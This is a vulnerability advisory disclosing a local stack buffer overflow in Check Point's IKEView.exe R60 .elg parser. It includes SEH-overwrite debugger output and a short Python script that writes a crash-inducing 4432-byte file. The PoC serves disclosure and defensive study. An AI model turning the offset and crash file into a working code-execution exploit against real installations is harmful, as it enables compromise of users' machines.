@@ -1,0 +1,143 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-IKEVIEWR60-0914.txt
+
+
+
+Vendor:
+================================
+www.checkpoint.com
+http://pingtool.org/downloads/IKEView.exe
+
+
+
+Product:
+==================================================
+IKEView.exe Feature Pack NGX R60 - Build 591000004
+
+IKEVIew.EXE is used to inspect - internet private key exchanges on the
+Firewall
+phase(1 & 2) packets being exchanged with switches and gateways.
+
+
+IKEVIEW is a Checkpoint Partner tool available for VPN troubleshooting
+purposes.
+It is a Windows executable that can be downloaded from Checkpoint.com.
+This file parses the IKE.elg file located on the firewall.
+
+To use IKEVIEW for VPN troubleshooting do the following:
+
+1. From the checkpoint firewall type the following:
+
+vpn debug ikeon
+
+This will create the IKE.elg file located in $FWDIR/log
+
+
+2. Attempt to establish the VPN tunnel. All phases of the connection will
+be logged to the IKE.elg file.
+
+
+3. SCP the file to your local desktop.
+WINSCP works great
+
+4. Launch IKEVIEW and select File>Open. Browse to the IKE.elg file.
+
+
+
+Vulnerability Type:
+======================
+Stack Buffer Overflow
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+IKEView.exe is vulnerable to local stack based buffer overflow when parsing
+an malicious (internet key exchange) ".elg" file.
+Vulnerability causes nSEH & SEH pointer overwrites at 4432 bytes after
+IKEView parses our malicious file, which may result then
+result in arbitrary attacker supplied code execution.
+
+Tested on Windows SP1
+
+
+0018F868  |41414141  AAAA
+0018F86C  |01FC56D0  ÐVü  ASCII "File loaded in 47 minutes, 00 seconds."
+0018F870  |41414141  AAAA
+0018F874  |41414141  AAAA  Pointer to next SEH record
+0018F878  |42424242  BBBB  SE handler
+0018F87C  |00000002   ...
+
+
+Quick Buffer Overflow POC :
+===========================
+
+
+1) Below python file to create POC save as .py it will generate POC file,
+open in IKEView.exe and KABOOOOOOOOOOOOOOOOOOOOM!
+
+seh="B"*4 #<----------will overwrite SEH with bunch of 42's HEX for 'B'
+ASCII char.
+
+file="C:\\IKEView-R60-buffer-overflow.elg"
+x=open(file,"w")
+payload="A"*4428+seh
+x.write(payload)
+x.close()
+
+print "\n=======================================\n"
+print " IKEView-R60-buffer-overflow.elg file created\n"
+print " hyp3rlinx ..."
+print "=========================================\n"
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Vulnerable Product:             [+] IKEView.exe Feature Pack NGX R60 -
+Build 591000004
+
+
+Vulnerable File Type:           [+] .elg
+
+
+Affected Area(s):               [+] Local OS
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
